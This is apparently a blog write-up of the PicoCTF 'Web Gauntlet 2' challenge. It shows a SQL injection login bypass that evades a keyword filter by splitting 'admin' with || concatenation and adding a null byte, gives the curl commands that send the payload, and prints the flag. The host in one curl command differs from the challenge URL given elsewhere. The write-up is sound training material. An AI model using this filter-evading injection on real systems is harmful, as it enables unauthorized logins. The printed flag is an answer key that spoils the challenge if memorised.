---
title: "PicoCTF - Web Gauntlet 2"
author: r2cook
categories:
  - PicoCTF
tags:
  - SQLI
  - filter-bypass
  - null-byte-injection
render_with_liquid: false
media_subpath: /images/picoctf/
image:
  path: room_card.png
---

# Web Gauntlet 2

Platform: PicoCTF   
Category: Web Exploitation  
Difficulty: Medium

---

## Description

This website looks familiar... Log in as admin.

---

## Given Files / Access

- Files: None
    
- URL: [http://mercury.picoctf.net:35178/](http://mercury.picoctf.net:35178/)
    
- IP: mercury.picoctf.net:35178
    

---

## Initial Recon / Enumeration

Commands / Tools:

- Browser inspection
    
- Viewing `/filter.php`
    
- cURL
    

Notes:

- Found a filter page showing blocked keywords.
    
- Filter blocks: `or`, `and`, `true`, `false`, `union`, `like`, `=`, `>`, `<`, `;`, `--`, `/*`, `*/`, `admin`.
    

---

## Analysis

- What is happening?  
    The login form is vulnerable to SQL injection, but with heavy keyword filtering.
    
- What is the vulnerability / trick?  
    The filter blocks common SQL keywords and even the string `admin`. However:
    
    - SQLite allows string concatenation using `||`
        
    - This can bypass the `admin` filter
        
    - A null byte (`%00`) can terminate the query early
        

---

## Exploitation / Solution

1. Identify that `admin` is blocked but can be split:
    
    ```sql
    'ad'||'min'
    ```
    
2. Construct payload:
    
    ```sql
    ad'||'min'%00
    ```
    
3. Use cURL to send the payload (since null byte can't be sent via browser):
    
    ```r
    curl --data "user=ad'||'min'%00&pass=pass" http://wily-courier.picoctf.net:50168/index.php --cookie "PHPSESSID=8eafaea191cf05a2a28a9cbd02c88fd5" --output -
    ```
    
4. Use the same session cookie to retrieve the flag:
    
    ```r
    curl http://mercury.picoctf.net:35178/filter.php --cookie "PHPSESSID=YOUR_SESSION"
    ```
    
5. Extract the flag from the response.
    

---

## Flag

```css
picoCTF{0n3_m0r3_t1m3_85a265ac}
```

---